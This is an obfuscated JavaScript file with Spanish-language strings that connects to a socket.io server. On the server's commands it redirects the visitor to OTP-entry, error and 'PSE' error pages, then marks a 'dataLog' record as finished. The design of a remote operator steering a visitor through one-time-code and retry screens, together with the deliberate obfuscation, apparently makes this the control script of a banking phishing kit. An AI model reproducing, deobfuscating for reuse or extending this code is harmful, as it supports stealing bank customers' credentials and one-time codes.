const _0x35d45e = _0x47e3;
(function (_0x4fe851, _0x4945ef) {
  const _0x414e64 = _0x47e3,
    _0x4cecf6 = _0x4fe851();
  while (!![]) {
    try {
      const _0x5abb7f =
        (parseInt(_0x414e64(0x17c)) / 0x1) *
          (parseInt(_0x414e64(0x190)) / 0x2) +
        -parseInt(_0x414e64(0x183)) / 0x3 +
        (-parseInt(_0x414e64(0x198)) / 0x4) *
          (-parseInt(_0x414e64(0x17f)) / 0x5) +
        -parseInt(_0x414e64(0x18e)) / 0x6 +
        -parseInt(_0x414e64(0x19d)) / 0x7 +
        -parseInt(_0x414e64(0x188)) / 0x8 +
        (parseInt(_0x414e64(0x1a0)) / 0x9) * (parseInt(_0x414e64(0x19e)) / 0xa);
      if (_0x5abb7f === _0x4945ef) break;
      else _0x4cecf6["push"](_0x4cecf6["shift"]());
    } catch (_0x592516) {
      _0x4cecf6["push"](_0x4cecf6["shift"]());
    }
  }
})(_0x5052, 0xa684f);
const dataLogId = localStorage[_0x35d45e(0x18f)]("dataLogId"),
  token = localStorage[_0x35d45e(0x18f)](_0x35d45e(0x187));
(!dataLogId || !token) &&
  (console[_0x35d45e(0x18a)](_0x35d45e(0x192)),
  alert(_0x35d45e(0x17d)),
  (window["location"]["href"] = _0x35d45e(0x199)));
const socket = io(url, { query: { token: token } });
function _0x5052() {
  const _0x3531b5 = [
    "data",
    "./otp.error.html",
    "3538893fdXfuf",
    "./errorPse.html",
    "Error\x20en\x20el\x20PUT\x20a\x20updateEndDataLog",
    "Hubo\x20un\x20error\x20al\x20actualizar\x20el\x20estado.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "dataLogToken",
    "7495520YOfiqj",
    "Bearer\x20",
    "error",
    "location",
    "message",
    "PUT",
    "3500298wutBQA",
    "getItem",
    "2OWiaQf",
    "origin",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "valor",
    "href",
    "/dataLogs/updateEndDataLog/",
    "json",
    "Estado\x20actualizado\x20correctamente\x20en\x20el\x20servidor.",
    "1915792yBLfaq",
    "./error.html",
    "Conectado\x20al\x20WebSocket",
    "connect",
    "Datos\x20recibidos:",
    "2848300fuTYSZ",
    "21048070asWYVQ",
    "valid",
    "9YcSCtK",
    "connect_error",
    "log",
    "./index.error.html",
    "726214YeuPgJ",
    "Hubo\x20un\x20error\x20al\x20cargar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "./otp.html",
    "10HBpqPX",
    "Error\x20al\x20actualizar\x20el\x20estado:",
  ];
  _0x5052 = function () {
    return _0x3531b5;
  };
  return _0x5052();
}
socket["on"](_0x35d45e(0x19b), () => console["log"](_0x35d45e(0x19a))),
  socket["on"](_0x35d45e(0x179), (_0xd3ad5d) =>
    console[_0x35d45e(0x18a)](
      "Error\x20de\x20conexión:",
      _0xd3ad5d[_0x35d45e(0x18c)]
    )
  ),
  socket["on"](_0x35d45e(0x181), async (_0x3d3c3a) => {
    const _0x5a1fdc = _0x35d45e;
    console[_0x5a1fdc(0x17a)](_0x5a1fdc(0x19c), _0x3d3c3a),
      console[_0x5a1fdc(0x17a)]("ID\x20de\x20dataLog:", dataLogId);
    if (String(_0x3d3c3a[_0x5a1fdc(0x19f)]) !== String(dataLogId)) return;
    const _0x54e2ca = {
      us: _0x5a1fdc(0x17b),
      din: _0x5a1fdc(0x17e),
      new_din: _0x5a1fdc(0x182),
      end: _0x5a1fdc(0x184),
    };
    if (_0x3d3c3a["valor"] in _0x54e2ca) {
      if (_0x3d3c3a[_0x5a1fdc(0x193)] === "end")
        try {
          await updateStatus();
        } catch (_0x282b78) {
          console[_0x5a1fdc(0x18a)](_0x5a1fdc(0x180), _0x282b78),
            alert(_0x5a1fdc(0x186));
          return;
        }
      window[_0x5a1fdc(0x18b)][_0x5a1fdc(0x194)] =
        _0x54e2ca[_0x3d3c3a[_0x5a1fdc(0x193)]];
    }
  });
function _0x47e3(_0x3fed64, _0x1a2bcd) {
  const _0x50526e = _0x5052();
  return (
    (_0x47e3 = function (_0x47e3a8, _0x507c08) {
      _0x47e3a8 = _0x47e3a8 - 0x179;
      let _0x47bdc7 = _0x50526e[_0x47e3a8];
      return _0x47bdc7;
    }),
    _0x47e3(_0x3fed64, _0x1a2bcd)
  );
}
async function updateStatus() {
  const _0x35e859 = _0x35d45e;
  try {
    const _0x22c43b = await fetch(url + _0x35e859(0x195) + dataLogId, {
      method: _0x35e859(0x18d),
      headers: {
        "Content-Type": "application/json",
        Authorization: _0x35e859(0x189) + token,
        Origin: window[_0x35e859(0x18b)][_0x35e859(0x191)],
      },
      body: JSON["stringify"]({ status: "Finalizado" }),
    });
    if (!_0x22c43b["ok"]) {
      const _0x4c2b74 = await _0x22c43b[_0x35e859(0x196)]();
      throw new Error(_0x4c2b74[_0x35e859(0x18a)] || _0x35e859(0x185));
    }
    console["log"](_0x35e859(0x197));
  } catch (_0x21fbe7) {
    throw _0x21fbe7;
  }
}
